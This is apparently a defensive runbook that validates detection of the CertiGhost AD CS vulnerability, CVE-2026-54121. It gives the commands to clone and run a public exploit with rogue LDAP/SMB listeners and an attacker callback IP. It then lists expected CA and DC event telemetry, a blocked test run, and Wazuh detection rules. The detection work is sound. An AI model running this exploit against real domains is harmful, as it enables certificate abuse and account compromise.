# CVE-2026-54121 — CertiGhost command validation

## Objective

Validate detection of CertiGhost AD CS requests. Public PoC: https://github.com/aniqfakhrul/CVE-2026-54121

## Preconditions

- Linux attacker host reachable by DC and CA.
- Run elevated: public PoC binds rogue LDAP `389` and SMB `445` listeners.
- Low-privileged domain user credential.
- CA audit events `4886`, `4887`, and `4888` enabled.
- Sysmon Event ID `3` collected for `certsrv.exe`.

## Public PoC

```bash
git clone https://github.com/aniqfakhrul/CVE-2026-54121.git
cd CVE-2026-54121
sudo python3 certighost.py \
  -d "$DOMAIN" \
  -u "$LOW_PRIV_USER" \
  -p "$LOW_PRIV_PASSWORD" \
  --dc-ip "$DC_IP" \
  --ca-ip "$CA_IP"
```

Optional when auto-detection selects wrong callback address:

```bash
sudo python3 certighost.py \
  -d "$DOMAIN" -u "$LOW_PRIV_USER" -p "$LOW_PRIV_PASSWORD" \
  --dc-ip "$DC_IP" --ca-ip "$CA_IP" --listener "$ATTACKER_CALLBACK_IP"
```

## Expected telemetry

| Source | Event | Required evidence |
|---|---:|---|
| CA Security | 4886 | `Attributes` contains both `cdc:` and `rmd:` |
| CA Security | 4888 | Same attributes plus denied disposition when patched/policy-blocked |
| CA Security | 4887 | Same attributes plus issuance: treat as probable exploit success |
| CA Sysmon | 3 | `certsrv.exe` outbound connection to non-loopback callback target |
| DC Security | 4741 | Newly created `GHOST*$` computer account; correlate by time |

## Validated run — 2026-07-27

- Public PoC executed from Linux attacker workstation with low-privileged domain credentials.
- CA emitted `4886`; decoded attributes contained `CertificateTemplate:Machine`, `cdc:<IPv4>`, and `rmd:DC01.SIMULATION.LOCAL`.
- CA emitted `4888`; disposition was `0x800706ba` — denied by Policy Module.
- Wazuh live alerts after custom-rule reload:
  - `100442`, level `15`: IP-literal `cdc` CertiGhost attempt.
  - `100443`, level `10`: CA denied CertiGhost request.
- No certificate issuance or PKINIT success observed. This was a blocked attempt, not a successful compromise.
- Generated `GHOST*$` computer accounts and generated `.pfx` / `.ccache` artifacts were removed and absence verified.

## Rule file

`rules/certighost_detection.xml`

| Rule | Meaning |
|---:|---|
| 100440 | AD CS request receipt, Security 4886 |
| 100441 | `cdc` + `rmd` request attributes |
| 100442 | High-confidence IP-literal `cdc` request |
| 100443 | Denied CertiGhost request, Security 4888 |
| 100444 | Certificate issuance with both attributes, Security 4887 |
| 100445 | Level-3 supporting visibility for any `certsrv.exe` non-loopback connection, Sysmon 3; not standalone CertiGhost proof |
